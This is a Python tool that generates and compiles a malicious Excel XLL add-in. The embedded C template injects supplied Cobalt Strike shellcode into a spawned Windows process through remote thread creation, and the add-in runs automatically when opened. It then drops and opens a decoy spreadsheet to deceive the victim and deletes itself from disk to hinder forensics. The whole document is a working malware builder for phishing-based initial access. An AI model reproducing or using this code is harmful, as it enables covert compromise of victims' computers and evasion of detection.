import os
import subprocess
import shutil
import zipfile
import argparse

C_TEMPLATE = r'''
#include <wchar.h>
#include <windows.h>
// x32
//Pastable: i686-w64-mingw32-gcc XLL_template.c 2013_Office_System_Developer_Resources/Excel2013XLLSDK/LIB/XLCALL32.LIB -o final.xll -s -DUNICODE -Os -shared -I Excel2013XLLSDK/INCLUDE/
// x64
//Pastable: x86_64-w64-mingw32-gcc XLL_template.c Excel2013XLLSDK/LIB/XLCALL32.LIB -o importantdoc.xll -s -DUNICODE -Os -shared -I Excel2013XLLSDK/INCLUDE

void Runner()
{
    //////////////////////////////////////////////////// Change 1 /////////////////////////////////////////////////////////////
    /////////////////////// Paste in Cobalt Strike Shellcode Below
    // Careful when compiling this works on x64 and z32 just use the proper bin file and proper compilation above
    unsigned char buf[] = "{BUF_ARRAY}";
    ///////////////////////////////////////////////////////////////////////

    HANDLE hProcess, hThread = NULL;
    DWORD  TID;
    LPVOID AllocBuffer;

    const wchar_t* processPath = L"C:\\\\Windows\\\\System32\\\\upnpcont.exe";

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    if (!CreateProcess(
        processPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
    )) return;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DWORD PID = pi.dwProcessId;
    int sizeshellcode = sizeof(buf);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) return;

    AllocBuffer = VirtualAllocEx(hProcess, NULL, sizeshellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (AllocBuffer == NULL) return;

    WriteProcessMemory(hProcess, AllocBuffer, buf, sizeshellcode, NULL);
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)AllocBuffer, NULL, 0, 0, &TID);
    return;
}

BOOL delete_from_path(LPCWSTR lpInputPath)
{
    WCHAR expandedPath[MAX_PATH];
    DWORD result = ExpandEnvironmentStringsW(lpInputPath, expandedPath, MAX_PATH);
    if (result == 0 || result > MAX_PATH)
        return FALSE;

    // Try to delete the file immediately
    if (DeleteFileW(expandedPath))
        return TRUE;

    // If that fails (e.g. in-use), schedule for deletion on reboot
    return MoveFileExW(expandedPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}


//Self-Deletion function
void deleteme()
{
    WCHAR wcPath[MAX_PATH + 1];
    RtlSecureZeroMemory(wcPath, sizeof(wcPath));
    HMODULE hm = NULL;

    //Get Handle to our DLL based on Runner() function
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)Runner, &hm);

    //Get path of our DLL
    GetModuleFileNameW(hm, wcPath, sizeof(wcPath));

    //Close handle to our DLL
    CloseHandle(hm);

    //Open handle to DLL with delete flag
    HANDLE hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // rename the associated HANDLE's file name
    FILE_RENAME_INFO* fRename;
    LPWSTR lpwStream = L":myname";
    DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO*)malloc(bsfRename);
    memset(fRename, 0, bsfRename);
    fRename->FileNameLength = bslpwStream;
    memcpy(fRename->FileName, lpwStream, bslpwStream);
    SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
    CloseHandle(hCurrent);

    // open another handle, trigger deletion on close
    hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // set FILE_DISPOSITION_INFO::DeleteFile to TRUE
    FILE_DISPOSITION_INFO fDelete;
    RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

    // trigger the deletion deposition on hCurrent
    CloseHandle(hCurrent);
}


void SpawnXlsx()
{
    //////////////////////////////////////////////////// Change 2 /////////////////////////////////////////////////////////////
    BYTE xlsx[] = {{XLSX_ARRAY}};
    BYTE zipfile[] = {{ZIP_ARRAY}};

    WCHAR xllPath[MAX_PATH];
    RtlSecureZeroMemory(xllPath, sizeof(xllPath));
    HMODULE hm = NULL;
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)Runner, &hm);
    GetModuleFileNameW(hm, xllPath, sizeof(xllPath));

    WCHAR* pos;
    int index = 0;
    int owlen;

    //////////////////////////////////////////////////// Change 3 /////////////////////////////////////////////////////////////
    WCHAR xllFileName[] = L"{XLL_NAME}.xll";
    WCHAR xlsxFileName[] = L"{XLL_NAME}.xlsx";

    owlen = wcslen(xllFileName);
    if (!wcscmp(xllFileName, xlsxFileName)) return;

    pos = wcsstr(xllPath, xllFileName);
    index = pos - xllPath;
    xllPath[index] = L'\0';
    wcscat(xllPath, xlsxFileName);

    DWORD dwBytesWritten = 0;
    HANDLE hFile = CreateFileW(xllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, xlsx, sizeof(xlsx), &dwBytesWritten, NULL);
    CloseHandle(hFile);

    WCHAR szFileName[MAX_PATH];
    GetModuleFileNameW(NULL, szFileName, MAX_PATH);
    WCHAR cmdArgs[510];
    swprintf_s(cmdArgs, MAX_PATH, L"%ls %ls", szFileName, xllPath);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcessW(NULL, cmdArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

int xlAutoOpen() {
    Runner();
    SpawnXlsx();
    deleteme();
    delete_from_path(L"{XLL_DELETE_PATH}");
    return 0;
}


'''

def zip_folder(folder_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, os.path.join(folder_path, '..'))
                zipf.write(full_path, arcname)

def format_bytes(buf):
    return ', '.join(f'0x{b:02X}' for b in buf)

def format_bin_bytes(buf):
    return ''.join(f'\\x{b:02X}' for b in buf)

def generate_c_file(xlsx_path, bin_path, output_path, deletexll_path=None):
    base = os.path.splitext(os.path.basename(xlsx_path))[0]
    temp_dir = base
    os.makedirs(temp_dir, exist_ok=True)
    temp_xlsx_path = os.path.join(temp_dir, os.path.basename(xlsx_path))
    shutil.copy(xlsx_path, temp_xlsx_path)

    zip_name = base + ".zip"
    zip_folder(temp_dir, zip_name)

    with open(temp_xlsx_path, 'rb') as xlsx_file:
        xlsx_data = xlsx_file.read()
    with open(zip_name, 'rb') as zip_file:
        zip_data = zip_file.read()

    buf_array = ""
    if bin_path:
        with open(bin_path, 'rb') as bin_file:
            bin_data = bin_file.read()
        buf_array = format_bin_bytes(bin_data)
    else:
        buf_array = "\\x66"  # default dummy byte

    c_output = C_TEMPLATE.replace("{XLSX_ARRAY}", format_bytes(xlsx_data))
    c_output = c_output.replace("{ZIP_ARRAY}", format_bytes(zip_data))
    c_output = c_output.replace("{BUF_ARRAY}", buf_array)
    c_output = c_output.replace("{XLL_NAME}", base)

     # Inject deletexll path or blank fallback
    if deletexll_path:
        deletexll_path = deletexll_path.replace("\\", "\\\\")  # escape for C string
        c_output = c_output.replace("{XLL_DELETE_PATH}", deletexll_path)
    else:
        c_output = c_output.replace('{XLL_DELETE_PATH}', '')
        
    with open(output_path, "w") as output_file:
        output_file.write(c_output)

    os.remove(zip_name)
    os.remove(temp_xlsx_path)
    os.rmdir(temp_dir)

    print(f"✅ {output_path} created successfully.")

def compile_xll(c_file, arch, output_name):
    sdk_include = "Excel2013XLLSDK/INCLUDE"
    sdk_lib     = "Excel2013XLLSDK/LIB/XLCALL32.LIB"

    if arch == "x32":
        cmd = [
            "i686-w64-mingw32-gcc", c_file, sdk_lib,
            "-o", output_name, "-s", "-DUNICODE", "-Os", "-shared", "-I", sdk_include
        ]
    elif arch == "x64":
        cmd = [
            "x86_64-w64-mingw32-gcc", c_file, sdk_lib,
            "-o", output_name, "-s", "-DUNICODE", "-Os", "-shared", "-I", sdk_include
        ]
    else:
        raise ValueError("Invalid arch: choose x32 or x64")

    print("⚙️  Running:", " ".join(cmd))
    subprocess.check_call(cmd)
    print(f"🎉 Built {output_name}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate XLL C template")
    parser.add_argument("--xlsx", required=True, help="Path to .xlsx file")
    parser.add_argument("--binfile", required=True, help="Path to raw shellcode binary")
    parser.add_argument("--arch", required=True, choices=["x32", "x64"], help="Target architecture")
    parser.add_argument("--output", default="XLL_template.c", help="Output C file name")
    parser.add_argument("--xlloutput", default="mysafexll.xll", help="Final XLL filename")
    parser.add_argument("--deletexll", help="Path to the XLL to delete (e.g. %USERNAME%/Desktop/file.xll)")
    args = parser.parse_args()


    if not os.path.isfile(args.xlsx):
        print("❌ Invalid XLSX path")
    elif args.binfile and not os.path.isfile(args.binfile):
        print("❌ Invalid binfile path")
    else:
        # generate_c_file(args.xlsx, args.binfile, args.output)
        generate_c_file(args.xlsx, args.binfile, args.output, deletexll_path=args.deletexll)
        compile_xll(args.output, args.arch, args.xlloutput)